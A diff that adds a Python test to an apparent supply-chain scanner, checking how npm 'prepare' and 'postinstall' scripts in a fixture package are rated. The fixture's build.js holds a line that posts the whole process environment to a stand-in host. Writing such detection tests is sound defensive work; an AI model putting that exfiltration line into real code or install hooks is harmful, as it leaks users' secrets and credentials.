@@ -285,6 +285,24 @@ def test_a_published_package_keeps_levels_only_for_what_installing_runs(tmp_path
     assert len(as_package.entry_points) == len(as_project.entry_points)
 
 
+def test_a_prepare_script_does_not_run_when_a_published_package_is_installed(tmp_path):
+    # npm runs `prepare` for a local or git install, not for a registry tarball, and the
+    # first benchmark detonation saw none of 22 popular packages' prepare scripts run.
+    steal = ("const https = require('https');\n"
+             "https.request({ hostname: 'example.invalid', method: 'POST' })"
+             ".end(JSON.stringify(process.env));\n")
+    root = build(tmp_path, {"package.json": package({"prepare": "node build.js"}),
+                            "build.js": steal})
+    as_package = scan([root], package=True)
+    assert [e.kind for e in as_package.entry_points] == ["prepare script"]
+    assert {f.level for f in as_package.findings} == {Level.INFO}
+    # A repository is installed locally or as a git dependency, where prepare does run.
+    assert Level.HIGH in {f.level for f in scan([root]).findings}
+    # An install hook in a published package keeps its level.
+    build(tmp_path, {"package.json": package({"postinstall": "node build.js"})})
+    assert Level.HIGH in {f.level for f in scan([root], package=True).findings}
+
+
 def test_a_setup_py_below_the_project_root_does_not_run_from_a_package(tmp_path):
     # Like Ansible's ansible/modules/setup.py: a module that shares the name. pip runs only
     # the setup.py of the root it installs, and a wheel runs none below its root.
